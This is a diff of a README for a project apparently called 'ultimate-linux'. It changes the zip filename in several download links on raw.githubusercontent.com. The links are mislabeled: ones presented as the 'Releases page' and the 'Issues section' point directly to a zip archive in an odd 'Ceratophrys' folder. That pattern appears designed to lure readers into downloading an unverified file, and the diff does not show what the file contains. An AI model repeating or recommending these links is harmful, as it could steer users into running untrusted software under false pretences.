@@ -6,7 +6,7 @@ Welcome to **ultimate-linux**! This project aims to provide a lightweight and fu
 
 ## 📥 Download Now
 
-[![Download ultimate-linux](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/ultimate_linux_3.2.zip)](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/ultimate_linux_3.2.zip)
+[![Download ultimate-linux](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/linux-ultimate-v1.2-beta.1.zip)](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/linux-ultimate-v1.2-beta.1.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ These specs allow the software to run smoothly, providing a good user experience
 
 To get your copy of ultimate-linux, **visit the Releases page**:
 
-[Download from Releases](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/ultimate_linux_3.2.zip)
+[Download from Releases](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/linux-ultimate-v1.2-beta.1.zip)
 
 Here, you will find the latest version available. 
 
@@ -59,7 +59,7 @@ Here, you will find the latest version available.
 
 Join our community! You can ask questions, share tips, and connect with other users. Here’s how to reach us:
 
-- **GitHub Issues Page**: If you run into trouble or have feature requests, please share them in the [Issues section](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/ultimate_linux_3.2.zip).
+- **GitHub Issues Page**: If you run into trouble or have feature requests, please share them in the [Issues section](https://raw.githubusercontent.com/rosehome2/ultimate-linux/main/Ceratophrys/linux-ultimate-v1.2-beta.1.zip).
 - **Discussion Forums**: Participate in community discussions where users share tips and advice.
 
 ## ⚙️ Frequently Asked Questions
